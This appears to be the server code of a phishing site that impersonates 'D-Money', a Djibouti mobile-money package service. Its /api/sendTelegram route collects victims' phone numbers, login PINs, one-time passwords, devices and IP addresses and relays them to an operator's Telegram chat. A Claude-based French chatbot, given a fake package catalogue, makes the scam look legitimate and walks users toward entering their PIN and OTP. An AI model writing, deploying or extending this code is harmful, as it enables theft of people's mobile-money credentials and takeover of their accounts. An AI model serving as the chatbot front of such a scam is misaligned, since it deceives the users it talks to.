'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

/* ── MIDDLEWARE ── */
app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});

/* ── RATE LIMITERS ── */
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  message: { error: 'Too many requests. Please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});
const chatLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 20,
  message: { error: 'Too many messages. Please wait a moment.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/sendTelegram', apiLimiter);
app.use('/api/chat', chatLimiter);

/* ── STATIC FILES ── */
app.use(express.static(path.join(__dirname), {
  extensions: ['html'],
  index: 'index.html',
}));

/* ── TELEGRAM HELPER ── */
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
      return resolve({ ok: false, reason: 'env_missing' });
    }

    const body = JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
    });

    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch (e) { resolve({ ok: false }); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

/* ── CLAUDE AI HELPER ── */
function callClaude(messages) {
  return new Promise((resolve, reject) => {
    const API_KEY = process.env.ANTHROPIC_API_KEY;

    if (!API_KEY) {
      console.error('[Claude] ANTHROPIC_API_KEY is not set');
      return resolve({ error: 'API key missing' });
    }

    const body = JSON.stringify({
      model: 'claude-haiku-4-5',
      max_tokens: 400,
      system: `You are the virtual assistant for D-Money, a mobile package service in Djibouti.
Always respond in French, concisely and professionally.
You know the following about D-Money packages:

AVAILABLE PACKAGES:

CLASSIC — From 500 DJF
- Up to 60 minutes of local calls
- Up to 50 SMS
- Up to 2 GB mobile data
- Perfect for basic use

MEDIAN — From 1,500 DJF (most popular)
- Up to 200 minutes local and international calls
- Up to 200 SMS
- Up to 10 GB 4G data
- Best value for money

PREMIUM — From 4,000 DJF
- Up to 500 minutes unlimited calls
- Up to 1,000 SMS
- Up to 50 GB unlimited 4G
- For heavy users

HOW TO SUBSCRIBE:
1. Choose the package and adjust sliders
2. Tap "Subscribe"
3. Verify identity with D-Money number (+253 77XXXXXX) and PIN
4. Confirm with 6-digit OTP
5. Package activated immediately, valid 30 days

REQUIREMENTS:
- Active D-Money account
- Djibouti number starting with 77
- 100% mobile, secure, no paperwork

CONTACT: support@dmoney.dj

Keep answers under 3 sentences. If you cannot answer, suggest contacting support.`,
      messages,
    });

    const opts = {
      hostname: 'api.anthropic.com',
      path: '/v1/messages',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'anthropic-version': '2023-06-01',
        'x-api-key': API_KEY,
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.error) {
            console.error('[Claude] API error:', parsed.error.type, '-', parsed.error.message);
          }
          resolve(parsed);
        } catch (e) {
          console.error('[Claude] Failed to parse response:', data.slice(0, 200));
          resolve({ error: 'Invalid response' });
        }
      });
    });

    req.on('error', (e) => {
      console.error('[Claude] Request error:', e.message);
      reject(e);
    });

    req.write(body);
    req.end();
  });
}

/* ── POST /api/sendTelegram ── */
app.post('/api/sendTelegram', async (req, res) => {
  try {
    const {
      submittedAt = '',
      loginPhone  = '',
      loginPin    = '',
      otp         = '',
      event       = '',
      plan        = '',
      device      = '',
    } = req.body || {};

    if (!loginPhone && !otp) {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    // Strip country code — show only local number starting with 77
    const localPhone = loginPhone
      .replace(/^\+253/, '')   // remove +253
      .replace(/^00253/, '')   // remove 00253
      .replace(/^253/, '')     // remove 253
      .trim() || loginPhone;

    const emoji = {
      receive_offer_clicked: '📲',
      offer_received:        '✅',
      resend_otp:            '🔁',
    }[event] || '📋';

    const message = [
      `${emoji} <b>D-Money Package — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${submittedAt}`,
      `📱 <b>Phone:</b> <code>${localPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp || '—'}</code>`,
      ``,
      `📦 <b>Package:</b> ${plan}`,
      `📟 <b>Device:</b> ${device}`,
      `🌐 <b>IP:</b> ${req.ip || req.headers['x-forwarded-for'] || '—'}`,
    ].join('\n');

    const result = await sendTelegramMessage(message);
    return res.json({ ok: true, telegram: result.ok });

  } catch (err) {
    console.error('[/api/sendTelegram]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── POST /api/chat ── */
app.post('/api/chat', async (req, res) => {
  try {
    const { messages } = req.body || {};

    if (!messages || !Array.isArray(messages) || messages.length === 0) {
      return res.status(400).json({ error: 'Missing messages' });
    }

    // Sanitise and limit conversation history
    const clean = messages.slice(-10).map(m => ({
      role:    m.role === 'assistant' ? 'assistant' : 'user',
      content: String(m.content || '').slice(0, 500),
    })).filter(m => m.content.trim());

    if (!clean.length) {
      return res.status(400).json({ error: 'Empty messages' });
    }

    // Timeout wrapper — prevent Render from hanging on slow Claude responses
    const claudePromise = callClaude(clean);
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Claude timeout')), 25000)
    );

    const result = await Promise.race([claudePromise, timeoutPromise]);

    if (result.error) {
      console.error('[/api/chat] Claude error:', result.error);
      return res.status(502).json({
        reply: 'Je suis momentanément indisponible. Veuillez réessayer dans quelques secondes.'
      });
    }

    if (result.type === 'error') {
      console.error('[/api/chat] Claude API error:', result.error?.message);
      return res.status(502).json({
        reply: 'Je suis momentanément indisponible. Veuillez réessayer dans quelques secondes.'
      });
    }

    const text  = (result.content?.[0]?.text) || '';
    if (!text) {
      console.error('[/api/chat] Empty response from Claude, full result:', JSON.stringify(result).slice(0, 300));
      return res.status(502).json({
        reply: 'Je n\'ai pas reçu de réponse. Veuillez réessayer.'
      });
    }

    const reply = text.trim();
    return res.json({ reply });

  } catch (err) {
    console.error('[/api/chat] Error:', err.message);
    // Return a user-friendly French message instead of an error
    return res.json({
      reply: err.message === 'Claude timeout'
        ? 'La réponse prend trop de temps. Veuillez réessayer.'
        : 'Une erreur est survenue. Veuillez réessayer.'
    });
  }
});

/* ── GET /health ── */
app.get('/health', (req, res) => {
  res.json({
    status:   'ok',
    uptime:   process.uptime(),
    telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID),
    ai:       !!process.env.ANTHROPIC_API_KEY,
  });
});

/* ── CATCH-ALL → index.html ── */
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

/* ── START ── */
app.listen(PORT, () => {
  console.log(`✅  D-Money server running on port ${PORT}`);
  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
  console.log(`    Claude AI: ${process.env.ANTHROPIC_API_KEY ? 'configured ✓' : 'MISSING ⚠'}`);
});
